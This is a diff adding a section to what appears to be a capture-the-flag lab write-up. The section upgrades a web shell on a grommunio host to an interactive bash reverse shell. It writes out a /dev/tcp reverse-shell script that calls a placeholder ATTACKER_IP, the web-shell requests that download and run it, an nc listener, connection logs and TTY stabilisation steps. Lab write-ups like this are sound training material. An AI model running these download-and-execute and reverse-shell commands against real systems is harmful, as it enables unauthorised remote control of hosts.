@@ -592,6 +592,83 @@ uid=462(grofiles) gid=462(grofiles) groups=462(grofiles)
 
 - Confirmed remote code execution on the Linux host via the uploaded web shell.
 - The execution context is the service account `grofiles` (uid 462), which runs grommunio Files' PHP. This is the foothold identity for the Linux privilege-escalation chain that follows.
+
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 3.4 Upgrade to an interactive reverse shell
+
+Driving the target one URL at a time is slow and loses state between requests. Trade the single-command web shell for a full interactive reverse shell. This is a Linux host, so the payload is bash, not PowerShell (a common time-sink here).
+
+The staged approach: host a bash reverse-shell script on the attacker, have the web shell download it, then execute it.
+
+**Commands:**
+
+```bash
+# Attacker: reverse-shell script, served over HTTP
+cat > rev.sh <<'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+EOF
+python3 -m http.server 8000
+
+# Attacker: listener (separate terminal)
+nc -lvnp 4444
+
+# Trigger via the web shell (separate terminal): fetch then run
+curl -k 'https://grommunio.autopilot.htb/files/data/deborah.hernandez/files/shell.php?cmd=curl%20http://ATTACKER_IP:8000/rev.sh%20-o%20/tmp/rev.sh'
+curl -k 'https://grommunio.autopilot.htb/files/data/deborah.hernandez/files/shell.php?cmd=bash%20/tmp/rev.sh'
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` | Reverse shell | Opens an interactive bash whose input/output are redirected over a TCP socket back to the attacker, using bash's built-in `/dev/tcp` pseudo-device (no extra tooling needed on the target). |
+| `python3 -m http.server 8000` | Payload host | Serves `rev.sh` so the target can pull it. |
+| `nc -lvnp 4444` | Listener | Catches the incoming connection; `-l` listen, `-v` verbose, `-n` no DNS, `-p 4444` port. |
+| `cmd=curl ... -o /tmp/rev.sh` | Stage the script | First request: target downloads the script to a writable path (`/tmp`). `%20` are URL-encoded spaces. |
+| `cmd=bash /tmp/rev.sh` | Fire it | Second request: target runs the script, which connects back to the listener. |
+
+**Result:**
+
+```shell
+# python http.server
+TARGET_IP - - [18/Oct/2026 16:45:06] "GET /rev.sh HTTP/1.1" 200 -
+
+# nc listener
+listening on [any] 4444 ...
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 49804
+bash: cannot set terminal process group (1303): Inappropriate ioctl for device
+bash: no job control in this shell
+grofiles@grommunio:/var/lib/grommunio-files/data/deborah.hernandez/files$
+```
+
+![[autopilot_reverse_shell.png]]
+
+#### 3.4.1 Stabilise the TTY
+
+The raw shell has no job control or line editing (the `cannot set terminal process group` message). Upgrade it to a usable PTY:
+
+```bash
+# on the target shell
+script -qc /bin/bash /dev/null
+# background with Ctrl+Z, then on the attacker:
+stty raw -echo; fg
+# press Enter, then back in the target shell:
+export TERM=xterm-256color
+```
+
+**What this gives you:**
+
+- A stable, interactive foothold on the Linux host as the service account `grofiles`.
+- Exploitation is complete. The user flag is not readable here: on this box `user.txt` lives in `/root/`, so it is obtained only after reaching root in the privilege-escalation chain.
 <div align="center">
 <br>
 <br>
